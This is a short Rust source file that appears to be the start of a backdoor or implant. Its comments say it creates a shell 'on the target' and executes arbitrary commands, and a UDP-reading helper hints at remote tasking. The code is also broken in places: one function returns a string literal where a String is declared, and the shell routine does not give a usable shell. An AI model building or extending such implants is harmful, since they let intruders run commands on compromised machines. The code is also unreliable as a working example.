use std::process::Command;
use std::net::{SocketAddr, UdpSocket, TcpStream, TcpListener, IpAddr, Ipv4Addr};

// Function to execute command
//

// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}

pub fn get_info() -> String {
    return "test anchovy";

}


// Reads in bytes from the given UDP socket and returns the string
pub fn read_udp(socket: UdpSocket, num_bytes: usize) -> String {
    let mut buf = vec![0; num_bytes];
    let (_bytes, src) = socket.recv_from(&mut buf).unwrap();
    return String::from_utf8_lossy(&buf[..]).into_owned();
}


